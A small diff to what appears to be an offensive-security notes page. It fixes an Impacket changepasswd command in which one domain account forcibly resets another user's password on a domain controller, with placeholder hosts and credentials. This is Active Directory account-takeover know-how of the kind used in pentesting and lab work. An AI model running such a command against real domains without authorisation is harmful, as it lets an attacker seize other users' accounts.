@@ -12,7 +12,7 @@
     
 #### 3) Impacket
 
-    impacket-changepasswd domain.local/USER1@DC_IP -newpass Password@1234 -altuser domain.local/TARGET_USER -altpass Password@1 -reset
+    impacket-changepasswd domain.local/TARGET_USER@DC_IP -newpass Password@1234 -altuser domain.local/USER1 -altpass Password@1 -reset
 
 Impacket’s changepassword can also be used to change current user password, if current password is known.
 
